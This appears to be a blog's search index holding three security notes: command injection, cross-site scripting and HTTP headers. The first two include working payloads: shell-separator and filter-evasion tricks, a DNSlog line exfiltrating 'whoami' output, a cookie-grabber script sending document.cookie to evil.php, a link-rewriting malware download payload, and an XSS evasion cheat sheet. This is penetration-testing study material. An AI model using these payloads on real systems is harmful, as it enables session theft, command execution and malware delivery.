<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Command Injection]]></title>
    <url>%2F2018%2F09%2F25%2FCommand-Injection%2F</url>
    <content type="text"><![CDATA[Common occurrences of vulnerabilitiesIt often occurs when unsafe data is passed to a system shell. Use of VulnerabilitiesList directory Get file content Get reverse shell Testing of Command Injectionwhite Box TestingWe focus particularly on the function that calls system shell. Andwe try to add a semicolon(or ‘|’, ‘&amp;&amp;’ and so on) and another commandto the input parameter, then we can observe result whether the commandthat we injected has been executed. Csystemexectl phpsystemexecshell_execpassthrupopenproc_openpcntl_exec Command Injection Filter Evasion Cheat SheetSeparator | || ; &amp; &amp;&amp; No space cat&lt;flag cat${IFS}flag cat$IFS”flag” cat flag(Tab) Filter special characters $(printf$IFS”\x77\x68\x6f\x61\x6d\x69”) No visual output ping `whoami`.rg1ido.ceye.io Use DNSlog to receive data To be continue]]></content>
      <categories>
        <category>Injection</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cross-site Scripting]]></title>
    <url>%2F2018%2F09%2F12%2FCross-site-Scripting%2F</url>
    <content type="text"><![CDATA[Common occurrences of vulnerabilitiesThe data is included in dynamic content(web request requently) that enters a Web application and then is sent to a web user.Typical examples User/Profiles page Shopping cart File Manager Application settings/preferences Forum/Message board Blog Log Type Stored XSS AttacksThese are those where the injected script is permanently stored on the target servers, such as in a database, in a message, in a message forum, visitor log, comment field, etc. Reflected XSS AttacksThese are those where the injected script is reflected directly off the web server when the request is sent. DOM XSS AttacksDOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write). Use of VulnerabilitiesCookie Grabber1234567&lt;script&gt;Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);var img = document.createElement(“img”);var d1 = document.getElementById(“d1”);img.src = adr;d1.appendChild(img);&lt;/script&gt; Download of malicious software1234http://example.com/index.php?id=&lt;script&gt;window.onload = function() &#123;var AllLinks=document.getELementByTagName(&quot;a&quot;);AllLinks[0].href = &quot;http://badexample.com/malicious.exe&quot;;&#125;&lt;/script&gt; Testing of Cross site scriptingReflected XSSBlack Box testing &lt;script&gt;alert(123)&lt;/script&gt; “&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; Detect input vectors. Use one of the examples showed above to be input data in every input vector, then examine the resulting web page HTML and search for the test input. Stored XSSBlack Box testingIt’s similar to the process. We can exploit Stored XSS by some advancedexploitation framework(Beff, XSS Proxy). White Box testingThe predefined variables/functions to store input from HTTP GET and POSTrequests need to be focus. PHP $_GET – HTTP GET variables$_POST – HTTP POST variables$_REQUEST – HTTP POST, GET and COOKIE variables$_FILES – HTTP File Upload variables ASP Request.QueryString – HTTP GETRequest.Form – HTTP POSTServer.CreateObject – Used to upload files JSP doGet, doPost servlets – HTTP GET and POSTrequest.getParameter – HTTP GET/POST variables DOM XSSWhite Box testingThe API need to be concerned are the following document.locationdocument.URLdocument.referrerwindow.locationdocument.writedocument.writelndocument.body.innerHTMLeval and so on. XSS Filter Evasion Cheat SheetImage tag&lt;IMG SRC=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt;No quotes and no semicolon&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;Case insensitive&lt;IMG SRC=JaVaScRiPt:alert(&#39;XSS&#39;)&gt;HTML entities&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;Grave accent obfuscation&lt;IMG SRC=`javascript:alert(“RSnake says, ‘XSS’”)`&gt;Malformed A tags&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;Malformed IMG tags&lt;IMG src=&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;fromCharCode&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt; To be continueXSS Prevention Cheat Sheet]]></content>
      <categories>
        <category>Injection</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http Protocol]]></title>
    <url>%2F2018%2F05%2F30%2FHttp-Protocol%2F</url>
    <content type="text"><![CDATA[Common request header information Accept: Display the resource types that the client can receive Accept-Encoding: Display the compression algorithms that the client supported Accept-Language: Display the language type that the client wants receive Cache-Control: Display the caching strategy used by the client(max-age=0 indicates that the client does not cache) Connection: Display the type of connection the client wants to open(long or short connection, long connection requires heartbeat to maintain) Cookie: A set of key-value pairs stored on the client to indicate the identity of the user Host: Display the domain name or IP that the client wants to request User-Agent: Discribes the detail of the client Referer: Tell the server which page the request came from if-modified-since: When the client’s cache has timed out, the request is sent. Then the server checks whether the resource has been modified since the last time it was sent to the client.If no changes have been the server returns 304, else it returns the modified resources. if-none-match: Similar to if-modified-since, but it checks the ETag, its priority is higher than if-modified-since Range: Indicates it only requests a part of resource Common response headers Cache-Control: Display caching rules of server Connection: Display the connection type that the server opens Content-Encoding: Display the compression algorithm used by server Content-Type: Display the resource types provided by the server Date: Display the time sent by the sever Transfer-Encoding: Display resource delivery method Content-length: This field is required when the resource is not transmited in blocks Cookie: A set of key-value pairs stored on the client to indicate the identity of the user Location: When the return code is 302, this value is the URL to be redirected Common Response Codes200 OK: Successful request 204 No Content: Indicates that the request has been successfully executed but no resources are returned 301 Moved Permanently: Indicates that the resource address has been changed forever with a new address returned in the Location field 302 Found: Indicates that the resource address has been changed temporarily with a new address returned in the Location field 304 Not Modified: Indicates that the requested resource has not changed and the cache can continue to be use 403 Forbidden: Indicates that the client does not have access to the resources 404 Not Found: Indicates that the resource does not exist 500 Internal ServerError: An error occurred on the server Cookies fieldname: Name of the cookies value: value of the cookies Expires: Expiration time of the cookies Path: The web path associated with the cookies Domain: The domain name associated with the cookies Secure: Specifies whether the cookie tranmission process uses a cryptographic protocol(usually https)]]></content>
      <categories>
        <category>Web Foundation</category>
      </categories>
      <tags>
        <tag>Http Headers</tag>
      </tags>
  </entry>
</search>
